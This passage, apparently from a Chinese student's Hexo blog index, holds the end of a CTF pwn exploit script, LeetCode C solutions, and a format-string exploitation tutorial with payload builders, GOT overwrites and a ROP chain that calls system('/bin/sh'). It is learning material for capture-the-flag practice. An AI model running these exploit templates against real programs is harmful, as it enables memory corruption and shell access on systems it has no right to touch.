class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>num<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Name for which?'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Give your name plz: '</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>shell <span class="token operator">=</span> <span class="token number">0x80485CB</span>get<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>get<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>get<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>get<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>get<span class="token punctuation">(</span><span class="token number">0x7</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span>shell<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>leetcode刷题（持续更新)</title>
      <link href="/2023/07/12/leetcode-shua-ti-chi-xu-geng-xin/leetcode-shua-ti-chi-xu-geng-xin/"/>
      <url>/2023/07/12/leetcode-shua-ti-chi-xu-geng-xin/leetcode-shua-ti-chi-xu-geng-xin/</url>
      
        <content type="html"><![CDATA[<p>算法算是从高三暑假就开始学了吧，但是后来学<code>pwn</code>之后也没时间学算法，学的一点也就应付一下数据结构与算法的期末考试有点用了…</p><p>为了提高编程和算法能力（混30分综测）准备开始刷题…目标是刷完<code>100</code>题！比起<code>Acwing</code>感觉<code>leetcode</code>难的多</p><p>上学期还说，用<code>C</code>打算法比赛的不是纯纯怨种吗，于是我来当怨种了（狗头）</p><h2 id="两数之和"><a href="#两数之和" class="headerlink" title="两数之和"></a><a href="https://leetcode.cn/problems/two-sum/">两数之和</a></h2><p><strong>题目描述：</strong>给定一个整数数组 <code>nums</code> 和一个整数目标值 <code>target</code>，请你在该数组中找出 <strong>和为目标值</strong> <em><code>target</code></em> 的那 <strong>两个</strong> 整数，并返回它们的数组下标。</p><p><strong>思路1：</strong>双重循环暴力解</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">int* twoSum(int* nums, int numsSize, int target, int* returnSize)&#123;    for(int i &#x3D; 0; i &lt; numsSize; i++)&#123;        for(int j &#x3D; i + 1; j &lt; numsSize; j++)&#123;            if(nums[i] + nums[j] &#x3D;&#x3D; target)&#123;                int* ret &#x3D; malloc(sizeof(int) * 2);                ret[0] &#x3D; i;                ret[1] &#x3D; j;                *returnSize &#x3D; 2;                return ret;             &#125;        &#125;    &#125;    *returnSize &#x3D; 0;    return NULL;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>思路2：</strong>利用哈希表判断循环到的数之前的数中有没有与该数相加等于目标数的，没有就将该数加入哈希表，时间复杂度降为<code>O(1)</code></p><p>但是<code>C</code>语言的哈希函数所需头文件要自己导入，比赛的时候也没有，所以我就没写，就学习了一下思路</p><h2 id="两数相加"><a href="#两数相加" class="headerlink" title="两数相加"></a><a href="https://leetcode.cn/problems/add-two-numbers/">两数相加</a></h2><p><strong>题目描述：</strong>给你两个 <strong>非空</strong> 的链表，表示两个非负的整数。它们每位数字都是按照 <strong>逆序</strong> 的方式存储的，并且每个节点只能存储 <strong>一位</strong> 数字。请你将两个数相加，并以相同形式返回一个表示和的链表。</p><p>考点大概就是链表操作吧…需要考虑进位和两个链表长度不同的情况</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">struct ListNode* addTwoNumbers(struct ListNode* l1, struct ListNode* l2)&#123;    struct ListNode *ret &#x3D; NULL,  *curr &#x3D; NULL;    int cnt &#x3D; 0;    while(l1 || l2)&#123;        int val1 &#x3D; l1 ? l1-&gt;val : 0;        int val2 &#x3D; l2 ? l2-&gt;val : 0;&#x2F;&#x2F;其中一个链表空了就取值为0        int sum &#x3D; val1 + val2 + cnt;                if(ret &#x3D;&#x3D; NULL)&#123;            ret &#x3D; curr &#x3D; malloc(sizeof(struct ListNode));            curr-&gt;val &#x3D; sum % 10;            curr-&gt;next &#x3D; NULL;        &#125;&#x2F;&#x2F;为头结点赋值        else&#123;            curr-&gt;next &#x3D; malloc(sizeof(struct ListNode));            curr-&gt;next-&gt;val &#x3D; sum % 10;            curr &#x3D; curr-&gt;next;            curr-&gt;next &#x3D; NULL;        &#125;                cnt &#x3D; sum &#x2F; 10;&#x2F;&#x2F;计算进位        if(l1)              l1 &#x3D; l1-&gt;next;        if(l2)            l2 &#x3D; l2-&gt;next;    &#125;    if(cnt &gt; 0)&#123;        curr-&gt;next &#x3D; malloc(sizeof(struct ListNode));        curr-&gt;next-&gt;val &#x3D; cnt;        curr-&gt;next-&gt;next &#x3D; NULL;    &#125;&#x2F;&#x2F;两个链表均为空之后多出的进位    return ret;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="无重复字符的最长子串"><a href="#无重复字符的最长子串" class="headerlink" title="无重复字符的最长子串"></a><a href="https://leetcode.cn/problems/longest-substring-without-repeating-characters/">无重复字符的最长子串</a></h2><p><strong>题目描述：</strong>给定一个字符串 <code>s</code> ，请你找出其中不含有重复字符的 <strong>最长子串</strong> 的长度。</p><p><strong>思路：</strong>滑动窗口，遍历每一位计算最长无重复字符的子串并记录最大长度</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">int lengthOfLongestSubstring(char * s)&#123;    int len &#x3D; strlen(s);     int res &#x3D; 0; &#x2F;&#x2F;记录最大长度    for (int i &#x3D; 0; i &lt; len; i++) &#123;        int visited[128] &#x3D; &#123;0&#125;; &#x2F;&#x2F;用于判断是否有重复        int max &#x3D; 0;         for (int j &#x3D; i; j &lt; len &amp;&amp; !visited[s[j]]; j++) &#123;            visited[s[j]] &#x3D; 1;            max++;        &#125;        if (max &gt; res)             res &#x3D; max;    &#125;    return res;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="寻找两个正序数组的中位数"><a href="#寻找两个正序数组的中位数" class="headerlink" title="寻找两个正序数组的中位数"></a><a href="https://leetcode.cn/problems/median-of-two-sorted-arrays/description/">寻找两个正序数组的中位数</a></h2><p><strong>题目描述：</strong>给定两个大小分别为 <code>m</code> 和 <code>n</code> 的正序（从小到大）数组 <code>nums1</code> 和 <code>nums2</code>。请你找出并返回这两个正序数组的 <strong>中位数</strong> 。</p><p><strong>思路1：</strong>直接合并两个数组去中位数</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">double findMedianSortedArrays(int* nums1, int nums1Size, int* nums2, int nums2Size)&#123;    int size &#x3D; nums1Size + nums2Size;    int q[size + 1], i &#x3D; 0, j &#x3D; 0, tmp &#x3D; 1;    while(i &lt; nums1Size &amp;&amp; j &lt; nums2Size)&#123;        if(nums1[i] &lt; nums2[j])            q[tmp++] &#x3D; nums1[i++];        else             q[tmp++] &#x3D; nums2[j++];    &#125;    while(i &lt; nums1Size)        q[tmp++] &#x3D; nums1[i++];    while(j &lt; nums2Size)        q[tmp++] &#x3D; nums2[j++];    if(size % 2)&#123;        return q[size &#x2F; 2 + 1];    &#125;else&#123;        return (q[size &#x2F; 2] + q[size &#x2F; 2 + 1]) &#x2F; 2.0;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>思路2：</strong>已知两数组长度，求中位数只要知道中间位置的数不一定要将数组合并</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">double findMedianSortedArrays(int* nums1, int nums1Size, int* nums2, int nums2Size) &#123;    int size &#x3D; nums1Size + nums2Size;    int i &#x3D; 0, j &#x3D; 0, count &#x3D; 0;    int res1 &#x3D; 0, res2 &#x3D; 0;    while (i &lt; nums1Size || j &lt; nums2Size) &#123;        if (j &#x3D;&#x3D; nums2Size || (i &lt; nums1Size &amp;&amp; nums1[i] &lt; nums2[j])) &#123;            count++;            if (count &#x3D;&#x3D; size &#x2F; 2) &#123;                res1 &#x3D; nums1[i];            &#125;            if (count &#x3D;&#x3D; size &#x2F; 2 + 1) &#123;                res2 &#x3D; nums1[i];                break;            &#125;            i++;        &#125; else &#123;            count++;            if (count &#x3D;&#x3D; size &#x2F; 2) &#123;                res1 &#x3D; nums2[j];            &#125;            if (count &#x3D;&#x3D; size &#x2F; 2 + 1) &#123;                res2 &#x3D; nums2[j];                break;            &#125;            j++;        &#125;    &#125;    if (size % 2 &#x3D;&#x3D; 1) &#123;        return res2;    &#125; else &#123;        return (res1 + res2) &#x2F; 2.0;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>思路3：</strong>中位数查找算法</p><ol><li>使用二分搜索找到一个划分点将两个数组分成左右两部分，使得左边部分的所有元素都小于右边部分的元素。</li><li>根据划分后两个部分的长度，判断是否找到了中位数。如果总长度为奇数，则中位数就是划分点左边部分的最大元素；如果总长度为偶数，则中位数是划分点左右两边部分的最大元素和最小元素的平均值。</li><li>如果划分点左边部分的最大元素大于右边部分的最小元素，则需要调整划分点，继续进行二分搜索。</li></ol><pre class="line-numbers language-C" data-language="C"><code class="language-C">double findMedianSortedArrays(int* nums1, int nums1Size, int* nums2, int nums2Size)&#123;    if(nums1Size &gt; nums2Size)     &#123;         return findMedianSortedArrays(nums2, nums2Size, nums1, nums1Size);    &#125; &#x2F;&#x2F;首先要满足第一个数组小于第二个数组    int total &#x3D; nums1Size + nums2Size; &#x2F;&#x2F;总计的数字，用于计算    int left &#x3D; 0, right &#x3D; nums1Size;     while(left &lt;&#x3D; right)     &#123;         int i &#x3D; (left+right)&#x2F;2; &#x2F;&#x2F;i为第一个数组线左边的数量        int j &#x3D; (total + 1) &#x2F; 2 - i;  &#x2F;&#x2F;j为第二个数组线左边的数量，使用total计算，如果total为奇数，线就偏向右边，如果偶数，分割线左右两边相等        if(i &lt; nums1Size &amp;&amp; nums2[j-1] &gt; nums1[i]) &#x2F;&#x2F;nums2[j-1] &gt; nums1[i]表示线要右移，如果i&#x3D;&#x3D;nums1Size那么就不用右移了        &#123;             left &#x3D; i + 1;         &#125;         else if(i &gt; 0 &amp;&amp; nums1[i-1] &gt; nums2[j]) &#x2F;&#x2F;nums1[i-1] &gt; nums2[j]表示线要左移，如果i&#x3D;&#x3D;0，就不用左移了        &#123;             right &#x3D; i - 1;         &#125;         else         &#123;             int max_left &#x3D; 0; &#x2F;&#x2F;以下对分割线左右四个元素操作            if(i &#x3D;&#x3D; 0) &#x2F;&#x2F;如果数组一分割线左边为0个，左边最大就是数组二分割线左边第一个            &#123;                 max_left &#x3D; nums2[j-1];             &#125; else if(j &#x3D;&#x3D; 0) &#x2F;&#x2F;如果数组二分割线左边为0个，左边最大就是数组一分割线左边第一个            &#123;                 max_left &#x3D; nums1[i-1];             &#125; else   &#x2F;&#x2F;否则就判断分割线左边两个的最大值            &#123;                 max_left &#x3D; fmax(nums1[i-1], nums2[j-1]);             &#125;             if(total % 2 &#x3D;&#x3D; 1) &#x2F;&#x2F;如果是奇数，就返回左边最大值，因为线是偏右边的            &#123;                 return max_left;             &#125;             int min_right &#x3D; 0;             if(i &#x3D;&#x3D; nums1Size) &#x2F;&#x2F;找右边最大值，偶数取左右两边最大值的平均数            &#123;                 min_right &#x3D; nums2[j];            &#125;             else if(j &#x3D;&#x3D; nums2Size)             &#123;                min_right &#x3D; nums1[i];             &#125;             else             &#123;                 min_right &#x3D; fmin(nums1[i], nums2[j]);             &#125;             return (max_left + min_right) &#x2F; 2.0;         &#125;     &#125;     return 0; &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《格式化字符串》</title>
      <link href="/2023/06/20/ge-shi-hua-zi-fu-chuan/ge-shi-hua-zi-fu-chuan/"/>
      <url>/2023/06/20/ge-shi-hua-zi-fu-chuan/ge-shi-hua-zi-fu-chuan/</url>
      
        <content type="html"><![CDATA[<h1 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h1><h2 id="基本格式"><a href="#基本格式" class="headerlink" title="基本格式"></a>基本格式</h2><pre class="line-numbers language-none"><code class="language-none">%[parameter][flags][field width][.precision][length]type<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>使用以<code>%</code>开头的格式说明符占位，在后面参数列表中提供相应变量</li><li><code>c</code>，把 int 参数转为 unsigned char 型输出</li><li><code>p</code>， void * 型，printf(“%p”,a) 用地址的格式打印变量 a 的值，printf(“%p”, &amp;a) 打印变量 a 所在的地址</li><li><code>n</code>，不输出字符，将该字符之前的字符数量写入参数中</li></ul><h2 id="泄露内存"><a href="#泄露内存" class="headerlink" title="泄露内存"></a>泄露内存</h2><p>利用格式化字符串漏洞，我们还可以获取我们所想要输出的内容。一般会有如下几种操作</p><ul><li>泄露栈内存<ul><li>获取某个变量的值</li><li>获取某个变量对应地址的内存</li></ul></li><li>泄露任意地址内存<ul><li>利用 <code>GOT</code> 表得到 <code>libc</code> 函数地址，进而获取 <code>libc</code>，进而获取其它 <code>libc</code> 函数地址</li><li>盲打，<code>dump</code> 整个程序，获取有用信息。</li></ul></li></ul><h2 id="覆盖内存"><a href="#覆盖内存" class="headerlink" title="覆盖内存"></a>覆盖内存</h2><p>payload：<code>‘%’ + str(target_addr) + &#39;c%offset$n&#39;</code></p><ul><li><code>hhn</code>:1字节（2位</li><li><code>hn</code>：2字节（4位</li><li><code>n</code>：4字节（8位</li></ul><h3 id="栈上的格式化字符串"><a href="#栈上的格式化字符串" class="headerlink" title="栈上的格式化字符串"></a>栈上的格式化字符串</h3><h4 id="确定偏移offset"><a href="#确定偏移offset" class="headerlink" title="确定偏移offset"></a>确定偏移offset</h4><p>在<code>printf</code>下断点，利用<code>fmtarg</code>工具获取偏移</p><h4 id="修改内存函数基本构造"><a href="#修改内存函数基本构造" class="headerlink" title="修改内存函数基本构造"></a>修改内存函数基本构造</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">fmt1</span><span class="token punctuation">(</span>prev<span class="token punctuation">,</span> word<span class="token punctuation">,</span> index<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> prev <span class="token operator">&lt;</span> word<span class="token punctuation">:</span>        result <span class="token operator">=</span> word <span class="token operator">-</span> prev        fmtstr <span class="token operator">=</span> <span class="token string">"%"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"c"</span>    <span class="token keyword">elif</span> prev <span class="token operator">==</span> word<span class="token punctuation">:</span>        result <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        result <span class="token operator">=</span> <span class="token number">256</span> <span class="token operator">+</span> word <span class="token operator">-</span> prev        fmtstr <span class="token operator">=</span> <span class="token string">"%"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"c"</span>    fmtstr <span class="token operator">+=</span> <span class="token string">"%"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"$hhn"</span>    <span class="token keyword">return</span> fmtstr<span class="token keyword">def</span> <span class="token function">fmt2</span><span class="token punctuation">(</span>offset<span class="token punctuation">,</span> size<span class="token punctuation">,</span> addr<span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> size <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>            payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>addr <span class="token operator">+</span> i<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>addr <span class="token operator">+</span> i<span class="token punctuation">)</span>    prev <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">+=</span> fmt<span class="token punctuation">(</span>prev<span class="token punctuation">,</span> <span class="token punctuation">(</span>target <span class="token operator">>></span> i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">,</span> offset <span class="token operator">+</span> i<span class="token punctuation">)</span>        prev <span class="token operator">=</span> <span class="token punctuation">(</span>target <span class="token operator">>></span> i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>    <span class="token keyword">return</span> payloadpayload <span class="token operator">=</span> fmt_str<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0x0804A028</span><span class="token punctuation">,</span><span class="token number">0x12345678</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>32位时自带函数：<code>fmtstr_payload(偏移，&#123;被改的got：要改的plt&#125;)</code></p><h4 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h4><ul><li>泄露libc等所需地址</li><li>将需要修改的地址写入栈</li><li>获取写入</li></ul><h3 id="非栈上格式化字符串漏洞"><a href="#非栈上格式化字符串漏洞" class="headerlink" title="非栈上格式化字符串漏洞"></a>非栈上格式化字符串漏洞</h3><p>技巧：1.改<code>ret</code>地址中的<code>libc_start_main</code>为<code>ogg</code></p><p>​          2.改<code>printf_got</code>为<code>system/ogg</code></p><p>​          3.泄露<code>stack</code>地址的时候如果<code>ebp</code>地址不对就用和<code>ebp</code>连接的地址一样的地址</p><pre class="line-numbers language-none"><code class="language-none">sys1 &#x3D; system &amp; 0xff #取低字节sys2 &#x3D; (system&gt;&gt;8) &amp; 0xffff #取第二三字节 gift_addr &#x3D; gift &amp; 0xffff #取低二字节p4 &#x3D; &#39;%&#39; + str(sys1) + &#39;c%8$hhn&#39; + &#39;%&#39; + str((gift_addr) - (sys1)) + &#39;c%9$hn&#39; + &#39;%&#39; + str(sys2-gift_addr) + &#39;c%10$hn&#39; r.sendlineafter(&#39;gift for you: \n&#39;,p4)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>若需分两次改则需要两条链，当第二次发送的数据小于第一次发送的数据时，要加<code>0x10000</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#简单的格式化字符串利用函数，将dest地址的后8字节循环更改成ptr对应的字节，off1与off2为上述（1）与（2）两个栈地址在格式化字符串中的偏移</span><span class="token keyword">def</span> <span class="token function">overlap</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span>ptr<span class="token punctuation">,</span>off1<span class="token punctuation">,</span>off2<span class="token punctuation">)</span><span class="token punctuation">:</span>    d<span class="token operator">=</span>dest<span class="token operator">&amp;</span><span class="token number">0xff</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> ptr<span class="token punctuation">:</span>            <span class="token keyword">break</span>        payload<span class="token operator">=</span><span class="token string">b'%'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'c%'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>off1<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'$hhn'</span>        p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'food: '</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>        f<span class="token operator">=</span>ptr<span class="token operator">&amp;</span><span class="token number">0xff</span>        payload<span class="token operator">=</span><span class="token string">b'%'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'c%'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>off2<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'$hhn'</span>        p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'food: '</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>        d<span class="token operator">+=</span><span class="token number">1</span>        ptr<span class="token operator">>></span><span class="token operator">=</span><span class="token number">8</span>ret<span class="token operator">=</span>rsp<span class="token operator">+</span><span class="token number">0x18</span>ptr<span class="token operator">=</span>libc<span class="token punctuation">.</span>address<span class="token operator">+</span><span class="token number">0x21112</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">.</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#通过将第25个参数传入格式化字符串，将第39个参数的值改为返回地址</span>payload<span class="token operator">=</span><span class="token string">b'%'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>ret<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'c%'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'$hn'</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'food: '</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span><span class="token comment">#覆盖返回地址为ptr（pop_rdi; ret）</span>overlap<span class="token punctuation">(</span>ret<span class="token punctuation">,</span>ptr<span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">)</span><span class="token comment">#覆盖返回地址+8的位置为binsh字符串地址</span>overlap<span class="token punctuation">(</span>ret<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">)</span><span class="token comment">#覆盖返回地址+16的位置为system函数的地址</span>overlap<span class="token punctuation">(</span>ret<span class="token operator">+</span><span class="token number">16</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">.</span>system<span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">)</span><span class="token comment">#至此，退出循环执行ROP后即可获取系统操作权限</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'food: '</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>泄露<code>libc</code>：<code>__libc_start_main</code></p></li><li><p>修改：<code>payload = (b&#39;%&#39; + bytes(str(one1), encoding=&#39;utf-8&#39;) + b&#39;c%8$hn&#39;).ljust(16, b&#39;a&#39;) + p64(exit_addr)</code>，分多次修改每次<code>sleep(0.5)</code></p></li><li><pre><code class="python">num = 12345num_bytes = num.to_bytes(2, byteorder=&#39;little&#39;)#转换为字节序列</code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 格式化字符串 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>how2heap(持续更新ing）</title>
      <link href="/2023/05/22/how2heap/how2heap-chi-xu-geng-xin-ing/"/>
      <url>/2023/05/22/how2heap/how2heap-chi-xu-geng-xin-ing/</url>
      
